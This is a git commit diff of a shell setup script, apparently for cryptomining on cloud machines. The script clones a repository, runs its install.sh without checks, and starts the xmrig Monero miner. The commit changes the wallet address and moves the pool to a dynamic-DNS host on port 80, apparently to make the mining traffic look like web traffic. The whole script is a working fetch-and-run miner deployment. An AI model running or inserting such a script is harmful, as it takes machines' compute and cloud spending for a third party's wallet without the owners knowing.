9ddb23409b0b9b55e7594c25aba90101f228c956
mrn-77 <81168526+mrn-77@users.noreply.github.com>
2022-08-25 03:27:36 +0200

    Update Init.sh
    Change wallet id, server address and paths

--- Init.sh
+++ Init.sh
@@ -2,10 +2,10 @@
 cd $HOME;
 sudo apt-get update --fix-missing;
 sudo apt-get -y install git build-essential cmake automake libtool autoconf wget;
-git clone https://github.com/PrandoXMR/cryptocloud.git;
-mv cryptocloud/install.sh $HOME;
+git clone https://github.com/mrn-77/xmrcryptoazure.git;
+mv xmrcryptoazure/install.sh $HOME;
 chmod +x install.sh;
 ./install.sh;
 cd $HOME/xmrig/build;
-./xmrig --rig-id=F4 -u 45fuUrFP8wXNhL6yw5Q8nnT5PZxT9qXuEDTPExtG38a6f7kweFVxij5aY4zXe6k6hYi7Uf63QSCMN1XCo9rQrwwUGJZwGSg -o us-west.minexmr.com:4444 
+./xmrig --rig-id=F4 -u 4A6HDgKihpfSUj79i8fNYyPk7C3WR4R1rZYyeEh4P81WQXQHAq74J1KAnUaHMmY1UvEMwkxaCRn1MK4b4CM32wDm5VoUHHw -o larissa.redirectme.net:80 
 "
